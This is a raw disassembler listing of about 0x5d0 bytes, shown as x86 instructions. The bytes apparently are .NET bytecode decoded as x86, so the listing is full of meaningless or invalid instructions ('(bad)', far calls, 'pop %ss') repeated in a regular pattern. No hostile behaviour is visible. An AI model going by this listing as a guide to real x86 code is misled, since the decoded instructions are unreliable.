  4047df:	90                   	nop
  4047e0:	2c 22                	sub    $0x22,%al
  4047e2:	11 29                	adc    %ebp,(%ecx)
  4047e4:	11 2a                	adc    %ebp,(%edx)
  4047e6:	11 24 17             	adc    %esp,(%edi,%edx,1)
  4047e9:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4047f0:	28 00                	sub    %al,(%eax)
  4047f2:	00 01                	add    %al,(%ecx)
  4047f4:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4047f7:	00 0a                	add    %cl,(%edx)
  4047f9:	28 6d 00             	sub    %ch,0x0(%ebp)
  4047fc:	00 0a                	add    %cl,(%edx)
  4047fe:	74 28                	je     0x404828
  404800:	00 00                	add    %al,(%eax)
  404802:	01 a2 38 9f 15 00    	add    %esp,0x159f38(%edx)
  404808:	00 11                	add    %dl,(%ecx)
  40480a:	23 72 73             	and    0x73(%edx),%esi
  40480d:	07                   	pop    %es
  40480e:	00 70 16             	add    %dh,0x16(%eax)
  404811:	28 69 00             	sub    %ch,0x0(%ecx)
  404814:	00 0a                	add    %cl,(%edx)
  404816:	16                   	push   %ss
  404817:	40                   	inc    %eax
  404818:	88 00                	mov    %al,(%eax)
  40481a:	00 00                	add    %al,(%eax)
  40481c:	06                   	push   %es
  40481d:	7b 28                	jnp    0x404847
  40481f:	00 00                	add    %al,(%eax)
  404821:	04 17                	add    $0x17,%al
  404823:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  40482a:	72 73                	jb     0x40489f
  40482c:	07                   	pop    %es
  40482d:	00 70 18             	add    %dh,0x18(%eax)
  404830:	8d 03                	lea    (%ebx),%eax
  404832:	00 00                	add    %al,(%eax)
  404834:	01 13                	add    %edx,(%ebx)
  404836:	25 11 25 16 28       	and    $0x28162511,%eax
  40483b:	38 00                	cmp    %al,(%eax)
  40483d:	00 06                	add    %al,(%esi)
  40483f:	a2 11 25 17 06       	mov    %al,0x6172511
  404844:	7b 28                	jnp    0x40486e
  404846:	00 00                	add    %al,(%eax)
  404848:	04 13                	add    $0x13,%al
  40484a:	29 11                	sub    %edx,(%ecx)
  40484c:	29 18                	sub    %ebx,(%eax)
  40484e:	13 2a                	adc    (%edx),%ebp
  404850:	11 2a                	adc    %ebp,(%edx)
  404852:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  404859:	24 14                	and    $0x14,%al
  40485b:	14 18                	adc    $0x18,%al
  40485d:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  404860:	00 01                	add    %al,(%ecx)
  404862:	13 26                	adc    (%esi),%esp
  404864:	11 26                	adc    %esp,(%esi)
  404866:	16                   	push   %ss
  404867:	16                   	push   %ss
  404868:	9c                   	pushf
  404869:	11 26                	adc    %esp,(%esi)
  40486b:	17                   	pop    %ss
  40486c:	17                   	pop    %ss
  40486d:	9c                   	pushf
  40486e:	11 26                	adc    %esp,(%esi)
  404870:	17                   	pop    %ss
  404871:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404875:	0a 26                	or     (%esi),%ah
  404877:	11 26                	adc    %esp,(%esi)
  404879:	17                   	pop    %ss
  40487a:	90                   	nop
  40487b:	2c 22                	sub    $0x22,%al
  40487d:	11 29                	adc    %ebp,(%ecx)
  40487f:	11 2a                	adc    %ebp,(%edx)
  404881:	11 24 17             	adc    %esp,(%edi,%edx,1)
  404884:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40488b:	28 00                	sub    %al,(%eax)
  40488d:	00 01                	add    %al,(%ecx)
  40488f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404892:	00 0a                	add    %cl,(%edx)
  404894:	28 6d 00             	sub    %ch,0x0(%ebp)
  404897:	00 0a                	add    %cl,(%edx)
  404899:	74 28                	je     0x4048c3
  40489b:	00 00                	add    %al,(%eax)
  40489d:	01 a2 38 04 15 00    	add    %esp,0x150438(%edx)
  4048a3:	00 11                	add    %dl,(%ecx)
  4048a5:	23 72 7b             	and    0x7b(%edx),%esi
  4048a8:	07                   	pop    %es
  4048a9:	00 70 16             	add    %dh,0x16(%eax)
  4048ac:	28 69 00             	sub    %ch,0x0(%ecx)
  4048af:	00 0a                	add    %cl,(%edx)
  4048b1:	16                   	push   %ss
  4048b2:	40                   	inc    %eax
  4048b3:	69 01 00 00 28 2e    	imul   $0x2e280000,(%ecx),%eax
  4048b9:	00 00                	add    %al,(%eax)
  4048bb:	06                   	push   %es
  4048bc:	39 5a 01             	cmp    %ebx,0x1(%edx)
  4048bf:	00 00                	add    %al,(%eax)
  4048c1:	06                   	push   %es
  4048c2:	7b 28                	jnp    0x4048ec
  4048c4:	00 00                	add    %al,(%eax)
  4048c6:	04 17                	add    $0x17,%al
  4048c8:	9a 28 3a 00 00 06 74 	lcall  $0x7406,$0x3a28
  4048cf:	09 00                	or     %eax,(%eax)
  4048d1:	00 1b                	add    %bl,(%ebx)
  4048d3:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  4048d7:	04 de                	add    $0xde,%al
  4048d9:	0f 25                	(bad)
  4048db:	28 29                	sub    %ch,(%ecx)
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	0a 13                	or     (%ebx),%dl
  4048e1:	19 28                	sbb    %ebp,(%eax)
  4048e3:	2a 00                	sub    (%eax),%al
  4048e5:	00 0a                	add    %cl,(%edx)
  4048e7:	de 00                	fiadds (%eax)
  4048e9:	7e 1c                	jle    0x404907
  4048eb:	00 00                	add    %al,(%eax)
  4048ed:	04 2d                	add    $0x2d,%al
  4048ef:	0f 72                	(bad)
  4048f1:	85 07                	test   %eax,(%edi)
  4048f3:	00 70 28             	add    %dh,0x28(%eax)
  4048f6:	1c 00                	sbb    $0x0,%al
  4048f8:	00 06                	add    %al,(%esi)
  4048fa:	dd ba 14 00 00 7e    	fnstsw 0x7e000014(%edx)
  404900:	1c 00                	sbb    $0x0,%al
  404902:	00 04 28             	add    %al,(%eax,%ebp,1)
  404905:	b1 00                	mov    $0x0,%cl
  404907:	00 0a                	add    %cl,(%edx)
  404909:	28 3b                	sub    %bh,(%ebx)
  40490b:	00 00                	add    %al,(%eax)
  40490d:	06                   	push   %es
  40490e:	14 72                	adc    $0x72,%al
  404910:	9b                   	fwait
  404911:	07                   	pop    %es
  404912:	00 70 1b             	add    %dh,0x1b(%eax)
  404915:	8d 03                	lea    (%ebx),%eax
  404917:	00 00                	add    %al,(%eax)
  404919:	01 13                	add    %edx,(%ebx)
  40491b:	25 11 25 16 7e       	and    $0x7e162511,%eax
  404920:	06                   	push   %es
  404921:	00 00                	add    %al,(%eax)
  404923:	04 a2                	add    $0xa2,%al
  404925:	11 25 17 7e 07 00    	adc    %esp,0x77e17
  40492b:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40492e:	11 25 18 7e 09 00    	adc    %esp,0x97e18
  404934:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404937:	11 25 19 7e 08 00    	adc    %esp,0x87e19
  40493d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404940:	11 25 1a 28 38 00    	adc    %esp,0x38281a
  404946:	00 06                	add    %al,(%esi)
  404948:	a2 11 25 13 24       	mov    %al,0x24132511
  40494d:	11 24 14             	adc    %esp,(%esp,%edx,1)
  404950:	14 1b                	adc    $0x1b,%al
  404952:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  404955:	00 01                	add    %al,(%ecx)
  404957:	13 26                	adc    (%esi),%esp
  404959:	11 26                	adc    %esp,(%esi)
  40495b:	16                   	push   %ss
  40495c:	17                   	pop    %ss
  40495d:	9c                   	pushf
  40495e:	11 26                	adc    %esp,(%esi)
  404960:	17                   	pop    %ss
  404961:	17                   	pop    %ss
  404962:	9c                   	pushf
  404963:	11 26                	adc    %esp,(%esi)
  404965:	18 17                	sbb    %dl,(%edi)
  404967:	9c                   	pushf
  404968:	11 26                	adc    %esp,(%esi)
  40496a:	19 17                	sbb    %edx,(%edi)
  40496c:	9c                   	pushf
  40496d:	11 26                	adc    %esp,(%esi)
  40496f:	1a 16                	sbb    (%esi),%dl
  404971:	9c                   	pushf
  404972:	11 26                	adc    %esp,(%esi)
  404974:	17                   	pop    %ss
  404975:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404979:	0a 26                	or     (%esi),%ah
  40497b:	11 26                	adc    %esp,(%esi)
  40497d:	16                   	push   %ss
  40497e:	90                   	nop
  40497f:	2c 22                	sub    $0x22,%al
  404981:	11 24 16             	adc    %esp,(%esi,%edx,1)
  404984:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40498b:	28 00                	sub    %al,(%eax)
  40498d:	00 01                	add    %al,(%ecx)
  40498f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404992:	00 0a                	add    %cl,(%edx)
  404994:	28 6d 00             	sub    %ch,0x0(%ebp)
  404997:	00 0a                	add    %cl,(%edx)
  404999:	74 28                	je     0x4049c3
  40499b:	00 00                	add    %al,(%eax)
  40499d:	01 80 06 00 00 04    	add    %eax,0x4000006(%eax)
  4049a3:	11 26                	adc    %esp,(%esi)
  4049a5:	17                   	pop    %ss
  4049a6:	90                   	nop
  4049a7:	2c 22                	sub    $0x22,%al
  4049a9:	11 24 17             	adc    %esp,(%edi,%edx,1)
  4049ac:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4049b3:	28 00                	sub    %al,(%eax)
  4049b5:	00 01                	add    %al,(%ecx)
  4049b7:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4049ba:	00 0a                	add    %cl,(%edx)
  4049bc:	28 6d 00             	sub    %ch,0x0(%ebp)
  4049bf:	00 0a                	add    %cl,(%edx)
  4049c1:	74 28                	je     0x4049eb
  4049c3:	00 00                	add    %al,(%eax)
  4049c5:	01 80 07 00 00 04    	add    %eax,0x4000007(%eax)
  4049cb:	11 26                	adc    %esp,(%esi)
  4049cd:	18 90 2c 22 11 24    	sbb    %dl,0x2411222c(%eax)
  4049d3:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  4049d9:	0a d0                	or     %al,%dl
  4049db:	28 00                	sub    %al,(%eax)
  4049dd:	00 01                	add    %al,(%ecx)
  4049df:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4049e7:	00 0a                	add    %cl,(%edx)
  4049e9:	74 28                	je     0x404a13
  4049eb:	00 00                	add    %al,(%eax)
  4049ed:	01 80 09 00 00 04    	add    %eax,0x4000009(%eax)
  4049f3:	11 26                	adc    %esp,(%esi)
  4049f5:	19 90 2c 22 11 24    	sbb    %edx,0x2411222c(%eax)
  4049fb:	19 9a 28 11 00 00    	sbb    %ebx,0x1128(%edx)
  404a01:	0a d0                	or     %al,%dl
  404a03:	28 00                	sub    %al,(%eax)
  404a05:	00 01                	add    %al,(%ecx)
  404a07:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404a0a:	00 0a                	add    %cl,(%edx)
  404a0c:	28 6d 00             	sub    %ch,0x0(%ebp)
  404a0f:	00 0a                	add    %cl,(%edx)
  404a11:	74 28                	je     0x404a3b
  404a13:	00 00                	add    %al,(%eax)
  404a15:	01 80 08 00 00 04    	add    %eax,0x4000008(%eax)
  404a1b:	38 88 13 00 00 11    	cmp    %cl,0x11000013(%eax)
  404a21:	23 72 a3             	and    -0x5d(%edx),%esi
  404a24:	07                   	pop    %es
  404a25:	00 70 16             	add    %dh,0x16(%eax)
  404a28:	28 69 00             	sub    %ch,0x0(%ecx)
  404a2b:	00 0a                	add    %cl,(%edx)
  404a2d:	16                   	push   %ss
  404a2e:	40                   	inc    %eax
  404a2f:	5f                   	pop    %edi
  404a30:	01 00                	add    %eax,(%eax)
  404a32:	00 06                	add    %al,(%esi)
  404a34:	7b 28                	jnp    0x404a5e
  404a36:	00 00                	add    %al,(%eax)
  404a38:	04 17                	add    $0x17,%al
  404a3a:	9a 28 3a 00 00 06 74 	lcall  $0x7406,$0x3a28
  404a41:	09 00                	or     %eax,(%eax)
  404a43:	00 1b                	add    %bl,(%ebx)
  404a45:	80 1d 00 00 04 de 0f 	sbbb   $0xf,0xde040000
  404a4c:	25 28 29 00 00       	and    $0x2928,%eax
  404a51:	0a 13                	or     (%ebx),%dl
  404a53:	1a 28                	sbb    (%eax),%ch
  404a55:	2a 00                	sub    (%eax),%al
  404a57:	00 0a                	add    %cl,(%edx)
  404a59:	de 00                	fiadds (%eax)
  404a5b:	7e 1d                	jle    0x404a7a
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	04 2d                	add    $0x2d,%al
  404a61:	0f 72                	(bad)
  404a63:	ad                   	lods   %ds:(%esi),%eax
  404a64:	07                   	pop    %es
  404a65:	00 70 28             	add    %dh,0x28(%eax)
  404a68:	1c 00                	sbb    $0x0,%al
  404a6a:	00 06                	add    %al,(%esi)
  404a6c:	dd 48 13             	fisttpll 0x13(%eax)
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	7e 1d                	jle    0x404a90
  404a73:	00 00                	add    %al,(%eax)
  404a75:	04 28                	add    $0x28,%al
  404a77:	b1 00                	mov    $0x0,%cl
  404a79:	00 0a                	add    %cl,(%edx)
  404a7b:	28 3b                	sub    %bh,(%ebx)
  404a7d:	00 00                	add    %al,(%eax)
  404a7f:	06                   	push   %es
  404a80:	14 72                	adc    $0x72,%al
  404a82:	9b                   	fwait
  404a83:	07                   	pop    %es
  404a84:	00 70 1b             	add    %dh,0x1b(%eax)
  404a87:	8d 03                	lea    (%ebx),%eax
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	01 13                	add    %edx,(%ebx)
  404a8d:	25 11 25 16 7e       	and    $0x7e162511,%eax
  404a92:	06                   	push   %es
  404a93:	00 00                	add    %al,(%eax)
  404a95:	04 a2                	add    $0xa2,%al
  404a97:	11 25 17 7e 07 00    	adc    %esp,0x77e17
  404a9d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404aa0:	11 25 18 7e 09 00    	adc    %esp,0x97e18
  404aa6:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404aa9:	11 25 19 7e 08 00    	adc    %esp,0x87e19
  404aaf:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404ab2:	11 25 1a 28 38 00    	adc    %esp,0x38281a
  404ab8:	00 06                	add    %al,(%esi)
  404aba:	a2 11 25 13 24       	mov    %al,0x24132511
  404abf:	11 24 14             	adc    %esp,(%esp,%edx,1)
  404ac2:	14 1b                	adc    $0x1b,%al
  404ac4:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  404ac7:	00 01                	add    %al,(%ecx)
  404ac9:	13 26                	adc    (%esi),%esp
  404acb:	11 26                	adc    %esp,(%esi)
  404acd:	16                   	push   %ss
  404ace:	17                   	pop    %ss
  404acf:	9c                   	pushf
  404ad0:	11 26                	adc    %esp,(%esi)
  404ad2:	17                   	pop    %ss
  404ad3:	17                   	pop    %ss
  404ad4:	9c                   	pushf
  404ad5:	11 26                	adc    %esp,(%esi)
  404ad7:	18 17                	sbb    %dl,(%edi)
  404ad9:	9c                   	pushf
  404ada:	11 26                	adc    %esp,(%esi)
  404adc:	19 17                	sbb    %edx,(%edi)
  404ade:	9c                   	pushf
  404adf:	11 26                	adc    %esp,(%esi)
  404ae1:	1a 16                	sbb    (%esi),%dl
  404ae3:	9c                   	pushf
  404ae4:	11 26                	adc    %esp,(%esi)
  404ae6:	17                   	pop    %ss
  404ae7:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404aeb:	0a 26                	or     (%esi),%ah
  404aed:	11 26                	adc    %esp,(%esi)
  404aef:	16                   	push   %ss
  404af0:	90                   	nop
  404af1:	2c 22                	sub    $0x22,%al
  404af3:	11 24 16             	adc    %esp,(%esi,%edx,1)
  404af6:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404afd:	28 00                	sub    %al,(%eax)
  404aff:	00 01                	add    %al,(%ecx)
  404b01:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404b04:	00 0a                	add    %cl,(%edx)
  404b06:	28 6d 00             	sub    %ch,0x0(%ebp)
  404b09:	00 0a                	add    %cl,(%edx)
  404b0b:	74 28                	je     0x404b35
  404b0d:	00 00                	add    %al,(%eax)
  404b0f:	01 80 06 00 00 04    	add    %eax,0x4000006(%eax)
  404b15:	11 26                	adc    %esp,(%esi)
  404b17:	17                   	pop    %ss
  404b18:	90                   	nop
  404b19:	2c 22                	sub    $0x22,%al
  404b1b:	11 24 17             	adc    %esp,(%edi,%edx,1)
  404b1e:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404b25:	28 00                	sub    %al,(%eax)
  404b27:	00 01                	add    %al,(%ecx)
  404b29:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404b2c:	00 0a                	add    %cl,(%edx)
  404b2e:	28 6d 00             	sub    %ch,0x0(%ebp)
  404b31:	00 0a                	add    %cl,(%edx)
  404b33:	74 28                	je     0x404b5d
  404b35:	00 00                	add    %al,(%eax)
  404b37:	01 80 07 00 00 04    	add    %eax,0x4000007(%eax)
  404b3d:	11 26                	adc    %esp,(%esi)
  404b3f:	18 90 2c 22 11 24    	sbb    %dl,0x2411222c(%eax)
  404b45:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  404b4b:	0a d0                	or     %al,%dl
  404b4d:	28 00                	sub    %al,(%eax)
  404b4f:	00 01                	add    %al,(%ecx)
  404b51:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404b54:	00 0a                	add    %cl,(%edx)
  404b56:	28 6d 00             	sub    %ch,0x0(%ebp)
  404b59:	00 0a                	add    %cl,(%edx)
  404b5b:	74 28                	je     0x404b85
  404b5d:	00 00                	add    %al,(%eax)
  404b5f:	01 80 09 00 00 04    	add    %eax,0x4000009(%eax)
  404b65:	11 26                	adc    %esp,(%esi)
  404b67:	19 90 2c 22 11 24    	sbb    %edx,0x2411222c(%eax)
  404b6d:	19 9a 28 11 00 00    	sbb    %ebx,0x1128(%edx)
  404b73:	0a d0                	or     %al,%dl
  404b75:	28 00                	sub    %al,(%eax)
  404b77:	00 01                	add    %al,(%ecx)
  404b79:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	28 6d 00             	sub    %ch,0x0(%ebp)
  404b81:	00 0a                	add    %cl,(%edx)
  404b83:	74 28                	je     0x404bad
  404b85:	00 00                	add    %al,(%eax)
  404b87:	01 80 08 00 00 04    	add    %eax,0x4000008(%eax)
  404b8d:	38 16                	cmp    %dl,(%esi)
  404b8f:	12 00                	adc    (%eax),%al
  404b91:	00 11                	add    %dl,(%ecx)
  404b93:	23 72 c3             	and    -0x3d(%edx),%esi
  404b96:	07                   	pop    %es
  404b97:	00 70 16             	add    %dh,0x16(%eax)
  404b9a:	28 69 00             	sub    %ch,0x0(%ecx)
  404b9d:	00 0a                	add    %cl,(%edx)
  404b9f:	16                   	push   %ss
  404ba0:	40                   	inc    %eax
  404ba1:	5f                   	pop    %edi
  404ba2:	01 00                	add    %eax,(%eax)
  404ba4:	00 06                	add    %al,(%esi)
  404ba6:	7b 28                	jnp    0x404bd0
  404ba8:	00 00                	add    %al,(%eax)
  404baa:	04 17                	add    $0x17,%al
  404bac:	9a 28 3a 00 00 06 74 	lcall  $0x7406,$0x3a28
  404bb3:	09 00                	or     %eax,(%eax)
  404bb5:	00 1b                	add    %bl,(%ebx)
  404bb7:	80 1e 00             	sbbb   $0x0,(%esi)
  404bba:	00 04 de             	add    %al,(%esi,%ebx,8)
  404bbd:	0f 25                	(bad)
  404bbf:	28 29                	sub    %ch,(%ecx)
  404bc1:	00 00                	add    %al,(%eax)
  404bc3:	0a 13                	or     (%ebx),%dl
  404bc5:	1b 28                	sbb    (%eax),%ebp
  404bc7:	2a 00                	sub    (%eax),%al
  404bc9:	00 0a                	add    %cl,(%edx)
  404bcb:	de 00                	fiadds (%eax)
  404bcd:	7e 1e                	jle    0x404bed
  404bcf:	00 00                	add    %al,(%eax)
  404bd1:	04 2d                	add    $0x2d,%al
  404bd3:	0f 72 d1 07          	psrld  $0x7,%mm1
  404bd7:	00 70 28             	add    %dh,0x28(%eax)
  404bda:	1c 00                	sbb    $0x0,%al
  404bdc:	00 06                	add    %al,(%esi)
  404bde:	dd d6                	fst    %st(6)
  404be0:	11 00                	adc    %eax,(%eax)
  404be2:	00 7e 1e             	add    %bh,0x1e(%esi)
  404be5:	00 00                	add    %al,(%eax)
  404be7:	04 28                	add    $0x28,%al
  404be9:	b1 00                	mov    $0x0,%cl
  404beb:	00 0a                	add    %cl,(%edx)
  404bed:	28 3b                	sub    %bh,(%ebx)
  404bef:	00 00                	add    %al,(%eax)
  404bf1:	06                   	push   %es
  404bf2:	14 72                	adc    $0x72,%al
  404bf4:	9b                   	fwait
  404bf5:	07                   	pop    %es
  404bf6:	00 70 1b             	add    %dh,0x1b(%eax)
  404bf9:	8d 03                	lea    (%ebx),%eax
  404bfb:	00 00                	add    %al,(%eax)
  404bfd:	01 13                	add    %edx,(%ebx)
  404bff:	25 11 25 16 7e       	and    $0x7e162511,%eax
  404c04:	06                   	push   %es
  404c05:	00 00                	add    %al,(%eax)
  404c07:	04 a2                	add    $0xa2,%al
  404c09:	11 25 17 7e 07 00    	adc    %esp,0x77e17
  404c0f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404c12:	11 25 18 7e 09 00    	adc    %esp,0x97e18
  404c18:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404c1b:	11 25 19 7e 08 00    	adc    %esp,0x87e19
  404c21:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404c24:	11 25 1a 28 38 00    	adc    %esp,0x38281a
  404c2a:	00 06                	add    %al,(%esi)
  404c2c:	a2 11 25 13 24       	mov    %al,0x24132511
  404c31:	11 24 14             	adc    %esp,(%esp,%edx,1)
  404c34:	14 1b                	adc    $0x1b,%al
  404c36:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  404c39:	00 01                	add    %al,(%ecx)
  404c3b:	13 26                	adc    (%esi),%esp
  404c3d:	11 26                	adc    %esp,(%esi)
  404c3f:	16                   	push   %ss
  404c40:	17                   	pop    %ss
  404c41:	9c                   	pushf
  404c42:	11 26                	adc    %esp,(%esi)
  404c44:	17                   	pop    %ss
  404c45:	17                   	pop    %ss
  404c46:	9c                   	pushf
  404c47:	11 26                	adc    %esp,(%esi)
  404c49:	18 17                	sbb    %dl,(%edi)
  404c4b:	9c                   	pushf
  404c4c:	11 26                	adc    %esp,(%esi)
  404c4e:	19 17                	sbb    %edx,(%edi)
  404c50:	9c                   	pushf
  404c51:	11 26                	adc    %esp,(%esi)
  404c53:	1a 16                	sbb    (%esi),%dl
  404c55:	9c                   	pushf
  404c56:	11 26                	adc    %esp,(%esi)
  404c58:	17                   	pop    %ss
  404c59:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404c5d:	0a 26                	or     (%esi),%ah
  404c5f:	11 26                	adc    %esp,(%esi)
  404c61:	16                   	push   %ss
  404c62:	90                   	nop
  404c63:	2c 22                	sub    $0x22,%al
  404c65:	11 24 16             	adc    %esp,(%esi,%edx,1)
  404c68:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404c6f:	28 00                	sub    %al,(%eax)
  404c71:	00 01                	add    %al,(%ecx)
  404c73:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404c76:	00 0a                	add    %cl,(%edx)
  404c78:	28 6d 00             	sub    %ch,0x0(%ebp)
  404c7b:	00 0a                	add    %cl,(%edx)
  404c7d:	74 28                	je     0x404ca7
  404c7f:	00 00                	add    %al,(%eax)
  404c81:	01 80 06 00 00 04    	add    %eax,0x4000006(%eax)
  404c87:	11 26                	adc    %esp,(%esi)
  404c89:	17                   	pop    %ss
  404c8a:	90                   	nop
  404c8b:	2c 22                	sub    $0x22,%al
  404c8d:	11 24 17             	adc    %esp,(%edi,%edx,1)
  404c90:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404c97:	28 00                	sub    %al,(%eax)
  404c99:	00 01                	add    %al,(%ecx)
  404c9b:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404c9e:	00 0a                	add    %cl,(%edx)
  404ca0:	28 6d 00             	sub    %ch,0x0(%ebp)
  404ca3:	00 0a                	add    %cl,(%edx)
  404ca5:	74 28                	je     0x404ccf
  404ca7:	00 00                	add    %al,(%eax)
  404ca9:	01 80 07 00 00 04    	add    %eax,0x4000007(%eax)
  404caf:	11 26                	adc    %esp,(%esi)
  404cb1:	18 90 2c 22 11 24    	sbb    %dl,0x2411222c(%eax)
  404cb7:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  404cbd:	0a d0                	or     %al,%dl
  404cbf:	28 00                	sub    %al,(%eax)
  404cc1:	00 01                	add    %al,(%ecx)
  404cc3:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404cc6:	00 0a                	add    %cl,(%edx)
  404cc8:	28 6d 00             	sub    %ch,0x0(%ebp)
  404ccb:	00 0a                	add    %cl,(%edx)
  404ccd:	74 28                	je     0x404cf7
  404ccf:	00 00                	add    %al,(%eax)
  404cd1:	01 80 09 00 00 04    	add    %eax,0x4000009(%eax)
  404cd7:	11 26                	adc    %esp,(%esi)
  404cd9:	19 90 2c 22 11 24    	sbb    %edx,0x2411222c(%eax)
  404cdf:	19 9a 28 11 00 00    	sbb    %ebx,0x1128(%edx)
  404ce5:	0a d0                	or     %al,%dl
  404ce7:	28 00                	sub    %al,(%eax)
  404ce9:	00 01                	add    %al,(%ecx)
  404ceb:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404cee:	00 0a                	add    %cl,(%edx)
  404cf0:	28 6d 00             	sub    %ch,0x0(%ebp)
  404cf3:	00 0a                	add    %cl,(%edx)
  404cf5:	74 28                	je     0x404d1f
  404cf7:	00 00                	add    %al,(%eax)
  404cf9:	01 80 08 00 00 04    	add    %eax,0x4000008(%eax)
  404cff:	38 a4 10 00 00 11 23 	cmp    %ah,0x23110000(%eax,%edx,1)
  404d06:	72 eb                	jb     0x404cf3
  404d08:	07                   	pop    %es
  404d09:	00 70 16             	add    %dh,0x16(%eax)
  404d0c:	28 69 00             	sub    %ch,0x0(%ecx)
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	16                   	push   %ss
  404d12:	40                   	inc    %eax
  404d13:	1f                   	pop    %ds
  404d14:	01 00                	add    %eax,(%eax)
  404d16:	00 06                	add    %al,(%esi)
  404d18:	7b 28                	jnp    0x404d42
  404d1a:	00 00                	add    %al,(%eax)
  404d1c:	04 17                	add    $0x17,%al
  404d1e:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  404d25:	72 9b                	jb     0x404cc2
  404d27:	07                   	pop    %es
  404d28:	00 70 1b             	add    %dh,0x1b(%eax)
  404d2b:	8d 03                	lea    (%ebx),%eax
  404d2d:	00 00                	add    %al,(%eax)
  404d2f:	01 13                	add    %edx,(%ebx)
  404d31:	25 11 25 16 7e       	and    $0x7e162511,%eax
  404d36:	06                   	push   %es
  404d37:	00 00                	add    %al,(%eax)
  404d39:	04 a2                	add    $0xa2,%al
  404d3b:	11 25 17 7e 07 00    	adc    %esp,0x77e17
  404d41:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404d44:	11 25 18 7e 09 00    	adc    %esp,0x97e18
  404d4a:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404d4d:	11 25 19 7e 08 00    	adc    %esp,0x87e19
  404d53:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404d56:	11 25 1a 28 38 00    	adc    %esp,0x38281a
  404d5c:	00 06                	add    %al,(%esi)
  404d5e:	a2 11 25 13 24       	mov    %al,0x24132511
  404d63:	11 24 14             	adc    %esp,(%esp,%edx,1)
  404d66:	14 1b                	adc    $0x1b,%al
  404d68:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  404d6b:	00 01                	add    %al,(%ecx)
  404d6d:	13 26                	adc    (%esi),%esp
  404d6f:	11 26                	adc    %esp,(%esi)
  404d71:	16                   	push   %ss
  404d72:	17                   	pop    %ss
  404d73:	9c                   	pushf
  404d74:	11 26                	adc    %esp,(%esi)
  404d76:	17                   	pop    %ss
  404d77:	17                   	pop    %ss
  404d78:	9c                   	pushf
  404d79:	11 26                	adc    %esp,(%esi)
  404d7b:	18 17                	sbb    %dl,(%edi)
  404d7d:	9c                   	pushf
  404d7e:	11 26                	adc    %esp,(%esi)
  404d80:	19 17                	sbb    %edx,(%edi)
  404d82:	9c                   	pushf
  404d83:	11 26                	adc    %esp,(%esi)
  404d85:	1a 16                	sbb    (%esi),%dl
  404d87:	9c                   	pushf
  404d88:	11 26                	adc    %esp,(%esi)
  404d8a:	17                   	pop    %ss
  404d8b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404d8f:	0a 26                	or     (%esi),%ah
  404d91:	11 26                	adc    %esp,(%esi)
  404d93:	16                   	push   %ss
  404d94:	90                   	nop
  404d95:	2c 22                	sub    $0x22,%al
  404d97:	11 24 16             	adc    %esp,(%esi,%edx,1)
  404d9a:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404da1:	28 00                	sub    %al,(%eax)
  404da3:	00 01                	add    %al,(%ecx)
  404da5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404da8:	00 0a                	add    %cl,(%edx)
  404daa:	28 6d 00             	sub    %ch,0x0(%ebp)
  404dad:	00 0a                	add    %cl,(%edx)
  404daf:	74 28                	je     0x404dd9
  404db1:	00 00                	add    %al,(%eax)
  404db3:	01 80 06 00 00 04    	add    %eax,0x4000006(%eax)
